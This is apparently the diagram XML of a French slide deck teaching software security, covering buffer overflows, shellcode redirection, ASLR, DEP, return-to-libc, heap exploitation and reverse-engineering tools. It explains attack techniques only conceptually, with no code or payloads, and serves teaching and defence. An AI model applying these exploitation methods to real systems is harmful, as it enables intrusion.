        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2715599"/>
          <a:ext cx="3733799" cy="53136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Solution :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="2741538"/>
        <a:ext cx="3681921" cy="479482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B0DB8-8A7A-EF40-A256-FBF988FF913E}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="768899"/>
          <a:ext cx="5334000" cy="2003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499872" rIns="41397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Les données écrites au-delà du buffer peuvent écraser des parties critiques (comme le pointeur d'exécution).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="768899"/>
        <a:ext cx="5334000" cy="2003400"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{5D2E9E15-159F-FA45-8BA2-C81C394FFDF4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="414659"/>
          <a:ext cx="3733799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Corruption de mémoire :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="301285" y="449244"/>
        <a:ext cx="3664629" cy="639310"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{7426B038-52B0-8A45-827F-8E2A59F7F637}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3256139"/>
          <a:ext cx="5334000" cy="1663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499872" rIns="41397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/>
            <a:t>Rediriger l’exécution du programme vers un shellcode malveillant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3256139"/>
        <a:ext cx="5334000" cy="1663199"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{93E50A61-E1C2-3D45-AF41-91EE1613B1FB}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2901899"/>
          <a:ext cx="3733799" cy="70848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Exploitation possible :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="301285" y="2936484"/>
        <a:ext cx="3664629" cy="63931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08F2F8-4AE8-8841-91D2-6158CD104FF1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1412174"/>
          <a:ext cx="5334000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548921-A045-564B-A58B-25280CB303D6}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="1190774"/>
          <a:ext cx="3733799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Qu’est-ce que l’ASLR ?</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="288316" y="1212390"/>
        <a:ext cx="3690567" cy="399568"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{56CC6397-FCFD-3249-87A1-036C3AC3526F}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2092574"/>
          <a:ext cx="533400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53805"/>
              <a:satOff val="-466"/>
              <a:lumOff val="38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12420" rIns="41397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Modifie les adresses mémoire à chaque exécution.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Empêche l’attaquant de prédire où injecter son code.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2092574"/>
        <a:ext cx="5334000" cy="874125"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8FB05076-E1EE-7645-8DF2-C0F4DCEE8538}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="1871174"/>
          <a:ext cx="3733799" cy="442800"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-753805"/>
            <a:satOff val="-466"/>
            <a:lumOff val="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Address Space Layout Randomization</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1500" kern="1200"/>
            <a:t> :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="288316" y="1892790"/>
        <a:ext cx="3690567" cy="399568"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{6B54582D-0BD3-8F4F-BC04-98E015073B5B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3269099"/>
          <a:ext cx="533400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12420" rIns="41397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b="1" kern="1200"/>
            <a:t>Sans ASLR :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1500" kern="1200"/>
            <a:t> Les adresses sont fixes.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b="1" kern="1200"/>
            <a:t>Avec ASLR :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1500" kern="1200"/>
            <a:t> Les adresses changent dynamiquement.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3269099"/>
        <a:ext cx="5334000" cy="874125"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8298FBC1-4264-4B4D-935D-F5BBD50F8319}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="3047699"/>
          <a:ext cx="3733799" cy="44280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Visualisation avant/après :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="288316" y="3069315"/>
        <a:ext cx="3690567" cy="399568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48E36C-F0C2-8440-B362-77306D726176}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="7852012" cy="17145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Problème adressé par l'attaque :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Les mécanismes modernes comme DEP (Data Execution Prevention) empêchent d'exécuter du code injecté dans la pile ou le tas.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Cependant, ces mécanismes n'empêchent pas d'appeler des fonctions légitimes existantes (comme celles de la libc).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1400" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="50216" y="50216"/>
        <a:ext cx="6079943" cy="1614068"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{79D77F75-AE2F-B247-93FB-F1EA6A36604B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1385649" y="2095500"/>
          <a:ext cx="7852012" cy="17145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Objectif de l'attaquant :</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="1800" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="1800" kern="1200"/>
            <a:t>Exploiter une vulnérabilité (souvent un débordement de tampon) pour manipuler le contrôle du programme et appeler des fonctions libc, par exemple, pour exécuter une commande shell.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1435865" y="2145716"/>
        <a:ext cx="5251506" cy="1614068"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{E390C19A-D785-BB48-A164-B71F7F8E3549}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="6737587" y="1347787"/>
          <a:ext cx="1114425" cy="111442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988333" y="1347787"/>
        <a:ext cx="612933" cy="838605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13B847-F044-294A-85C3-7C62CB9A1924}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4015183"/>
          <a:ext cx="5334000" cy="13178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Contournement de DEP :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="4015183"/>
        <a:ext cx="5334000" cy="711651"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{506B24C4-4A52-5A46-A21A-FBB1F3C8CDBF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="4700477"/>
          <a:ext cx="2667000" cy="60622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Pas besoin d'injecter du code.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="4700477"/>
        <a:ext cx="2667000" cy="606221"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{67E1DE26-058E-FA49-A77A-3164EB68274D}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="2667000" y="4700477"/>
          <a:ext cx="2667000" cy="606221"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:tint val="40000"/>
            <a:alpha val="90000"/>
            <a:hueOff val="-354831"/>
            <a:satOff val="5251"/>
            <a:lumOff val="48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54831"/>
              <a:satOff val="5251"/>
              <a:lumOff val="4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On réutilise du code existant en mémoire.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="2667000" y="4700477"/>
        <a:ext cx="2667000" cy="606221"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{088E40BD-1977-7C49-862C-453566EEF453}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm rot="10800000">
          <a:off x="0" y="2008063"/>
          <a:ext cx="5334000" cy="2026888"/>
        </a:xfrm>
        <a:prstGeom prst="upArrowCallout">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-753805"/>
            <a:satOff val="-466"/>
            <a:lumOff val="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Utilisation de la libc :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="-10800000">
        <a:off x="0" y="2008063"/>
        <a:ext cx="5334000" cy="711437"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{EC94485D-BB52-7E4E-B6D4-2492D170D08B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2719500"/>
          <a:ext cx="2667000" cy="606039"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:tint val="40000"/>
            <a:alpha val="90000"/>
            <a:hueOff val="-709661"/>
            <a:satOff val="10501"/>
            <a:lumOff val="96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09661"/>
              <a:satOff val="10501"/>
              <a:lumOff val="9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La bibliothèque libc contient des fonctions utiles comme system, execve, ou exit.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2719500"/>
        <a:ext cx="2667000" cy="606039"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{78354798-D776-E84D-A6E1-905DD9A8EE85}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="2667000" y="2719500"/>
          <a:ext cx="2667000" cy="606039"/>
        </a:xfrm>
        <a:prstGeom prst="rect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:tint val="40000"/>
            <a:alpha val="90000"/>
            <a:hueOff val="-1064492"/>
            <a:satOff val="15752"/>
            <a:lumOff val="145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064492"/>
              <a:satOff val="15752"/>
              <a:lumOff val="1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L'attaquant redirige le flux vers ces fonctions.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1300" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="2667000" y="2719500"/>
        <a:ext cx="2667000" cy="606039"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{68C3A1E4-41B5-8243-B8DC-C6C8706868C7}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm rot="10800000">
          <a:off x="0" y="942"/>
          <a:ext cx="5334000" cy="2026888"/>
        </a:xfrm>
        <a:prstGeom prst="upArrowCallou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Vulnérabilité utilisée :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB" sz="1900" kern="1200"/>
            <a:t> Dépassement de tampon sur la pile.</a:t>
          </a:r>
          <a:br>
            <a:rPr lang="en-GB" sz="1900" kern="1200"/>
          </a:br>
          <a:r>
            <a:rPr lang="en-GB" sz="1900" kern="1200"/>
            <a:t>Cela permet de corrompre la valeur de retour d'une fonction pour rediriger l'exécution.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1900" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="10800000">
        <a:off x="0" y="942"/>
        <a:ext cx="5334000" cy="1317011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8CC87-93EA-684C-9FDB-817F83573E05}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3219350"/>
          <a:ext cx="5334000" cy="21122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Impact :Rend les shellcodes classiques inutilisables.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3219350"/>
        <a:ext cx="5334000" cy="2112242"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{3F6FC470-31B9-784C-9A82-62C8884C8BE4}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm rot="10800000">
          <a:off x="0" y="2405"/>
          <a:ext cx="5334000" cy="3248629"/>
        </a:xfrm>
        <a:prstGeom prst="upArrowCallou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Protection mémoire Windows :Empêche l'exécution de code dans les segments non marqués comme exécutables (ex. : pile).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm rot="10800000">
        <a:off x="0" y="2405"/>
        <a:ext cx="5334000" cy="211086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66A6E-834C-42D0-992C-D6A5970398DF}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="798041" y="1210177"/>
          <a:ext cx="857882" cy="8578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C896D-B06F-4454-A3A5-B496117E0C07}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1435" y="2193346"/>
          <a:ext cx="2451093" cy="367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600" b="1" kern="1200"/>
            <a:t>Techniques :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1435" y="2193346"/>
        <a:ext cx="2451093" cy="367664"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{A681F59C-C6BB-4AFB-9586-8E74CD801467}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="1435" y="2619283"/>
          <a:ext cx="2451093" cy="1504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Corruption des pointeurs de la heap pour rediriger l’exécution.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Altération des données critiques pour détourner les flux d’exécution.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="1435" y="2619283"/>
        <a:ext cx="2451093" cy="1504538"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B9A6AED8-EA97-493E-86F0-2214FF6301E5}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="3678076" y="1210177"/>
          <a:ext cx="857882" cy="8578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645F8F-E476-4C34-9359-DF9B8EAA0790}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="2881470" y="2193346"/>
          <a:ext cx="2451093" cy="367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600" kern="1200"/>
            <a:t>Outils :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2600" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="2881470" y="2193346"/>
        <a:ext cx="2451093" cy="367664"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{DEA83E5E-D1D7-4848-938C-9C1DEFD9F196}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="2881470" y="2619283"/>
          <a:ext cx="2451093" cy="1504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Heap Explorer, WinDbg.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1700" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="2881470" y="2619283"/>
        <a:ext cx="2451093" cy="1504538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69D88-D18E-FC41-BEDD-57DAA52B697C}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="348981"/>
          <a:ext cx="5334000" cy="7512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74904" rIns="41397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IDA Pro, Ghidra, Radare2.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="348981"/>
        <a:ext cx="5334000" cy="751274"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{0FCC8A0B-BC00-114E-94B2-44CA99804C77}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="83301"/>
          <a:ext cx="3733799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Désassembleurs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="109240"/>
        <a:ext cx="3681921" cy="479482"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{E25A3894-845F-B440-B72D-16635BD7DF3D}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1463136"/>
          <a:ext cx="5334000" cy="7512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02537"/>
              <a:satOff val="-311"/>
              <a:lumOff val="25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74904" rIns="41397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Ghidra, IDA Hex-Rays.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="1463136"/>
        <a:ext cx="5334000" cy="751274"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{B16E641D-EF5D-0C4C-BCA5-29F75597D8F7}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="1197456"/>
          <a:ext cx="3733799" cy="531360"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-502537"/>
            <a:satOff val="-311"/>
            <a:lumOff val="2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Décompilateurs :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="1223395"/>
        <a:ext cx="3681921" cy="479482"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{FF34D8D2-04C2-364D-8571-6979F6CB90B7}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="2577291"/>
          <a:ext cx="5334000" cy="7512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005073"/>
              <a:satOff val="-621"/>
              <a:lumOff val="50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74904" rIns="41397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Binary Ninja pour la navigation dans le code.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="2577291"/>
        <a:ext cx="5334000" cy="751274"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{7D3146EA-70B7-8A4E-8CD6-1B66F50FA3D1}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2311611"/>
          <a:ext cx="3733799" cy="531360"/>
        </a:xfrm>
        <a:prstGeom prst="roundRect">
          <a:avLst/>
        </a:prstGeom>
        <a:solidFill>
          <a:schemeClr val="accent2">
            <a:hueOff val="-1005073"/>
            <a:satOff val="-621"/>
            <a:lumOff val="50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Visualisation :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="2337550"/>
        <a:ext cx="3681921" cy="479482"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{53F1A98A-7FDD-6E47-8DD1-986E74D9E89B}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3691447"/>
          <a:ext cx="5334000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374904" rIns="41397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PE-bear, Detect-It-Easy pour les binaires Windows (PE).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Binwalk, ExifTool pour les fichiers spécifiques.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3691447"/>
        <a:ext cx="5334000" cy="1559250"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{8187FE6D-C4AA-8F4A-97F0-3E919EE64DC7}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="3425767"/>
          <a:ext cx="3733799" cy="53136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Analyse structurelle :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="1800" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="292639" y="3451706"/>
        <a:ext cx="3681921" cy="479482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B5E03-FD43-C34C-ADBE-74315788C178}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="433874"/>
          <a:ext cx="5334000" cy="2165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520700" rIns="413978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/>
            <a:t>Pas besoin d'exécuter le programme.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/>
            <a:t>Détection de code malveillant sans risque.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="433874"/>
        <a:ext cx="5334000" cy="2165625"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{27AAC945-FBA7-BB48-91BE-7ECD8C6CC364}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="64874"/>
          <a:ext cx="3733799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Avantages :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="302726" y="100900"/>
        <a:ext cx="3661747" cy="665948"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{054BDF71-9EA9-5D4E-87E1-F232F7A53DBB}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="3103499"/>
          <a:ext cx="5334000" cy="2165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520700" rIns="413978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/>
            <a:t>Limité contre les binaires obfusqués ou cryptés.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500" kern="1200"/>
            <a:t>Analyse complexe pour les gros programmes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="0" y="3103499"/>
        <a:ext cx="5334000" cy="2165625"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{DB1F052C-0141-3D49-A67B-1F4D028D2B90}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="266700" y="2734499"/>
          <a:ext cx="3733799" cy="73800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Inconvénients :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2500" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="302726" y="2770525"/>
        <a:ext cx="3661747" cy="665948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FD2ABA-818C-42EC-9A95-B85052F9255F}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="0" y="1581"/>
          <a:ext cx="9237662" cy="8014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975C23-2F57-4A90-B0BE-B30D9858D421}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="242435" y="181905"/>
          <a:ext cx="440791" cy="4407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849AC-C0CF-4CE5-A83B-7CB5DA0277FC}">
      <dsp:nvSpPr>
        <dsp:cNvPr id="0" name=""/>
        <dsp:cNvSpPr/>
      </dsp:nvSpPr>
      <dsp:spPr>
        <a:xfrm>
          <a:off x="925662" y="1581"/>
          <a:ext cx="4156947" cy="80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9" tIns="84819" rIns="84819" bIns="8481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Configurer l’environnement :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US" sz="2200" kern="1200"/>
        </a:p>
      </dsp:txBody>
      <dsp:txXfrm>
        <a:off x="925662" y="1581"/>
        <a:ext cx="4156947" cy="801439"/>
      </dsp:txXfrm>
    </dsp:sp>
    <dsp:sp modelId="{FC557352-8EB6-4A8F-9BB2-35CE511E6A4B}">
